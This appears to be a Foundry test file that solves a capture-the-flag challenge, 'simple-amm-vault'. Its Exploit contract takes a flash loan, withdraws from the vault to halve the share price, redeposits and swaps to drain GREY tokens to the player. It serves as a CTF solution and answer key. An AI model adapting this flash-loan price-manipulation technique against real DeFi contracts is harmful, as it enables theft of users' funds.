// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test, console } from "forge-std/Test.sol";
import { Setup } from "../src/simple-amm-vault/Setup.sol";
import { SimpleVault } from "../src/simple-amm-vault/SimpleVault.sol";
import { SimpleAMM } from "../src/simple-amm-vault/SimpleAMM.sol";
import { GREY } from "../src/simple-amm-vault/lib/GREY.sol";
import { ISimpleCallbacks } from "../src/simple-amm-vault/interfaces/ISimpleCallbacks.sol";

contract SimpleAMMVaultTest is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    Setup setup;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        assertTrue(setup.isSolved(), "not solved");
        vm.stopPrank();
    }

    function setUp() public {
        startHoax(deployer);
        setup = new Setup();
        vm.stopPrank();
    }

    function test_simple_amm_vault() public checkSolvedByPlayer {
        new Exploit(setup).hack();
        setup.claim();
        console.log(setup.grey().balanceOf(player));
    }
}

contract Exploit is ISimpleCallbacks {
    GREY grey;
    SimpleVault vault;
    SimpleAMM amm;

    constructor (Setup setup) {
        grey = setup.grey();
        vault = setup.vault();
        amm = setup.amm();
    }

    function hack() external {
        amm.flashLoan(true, 1000e18, "");
        amm.swap(true, 0, 1000e18);
        grey.transfer(msg.sender, grey.balanceOf(address(this)));
    }

    function onFlashLoan(uint256 amount, bytes calldata) external {
        console.log(vault.sharePrice());    // 2e18
        vault.withdraw(amount);
        console.log(vault.sharePrice());    // 1e18

        grey.approve(address(vault), amount);
        vault.deposit(amount);
        vault.approve(address(amm), amount);
    }
}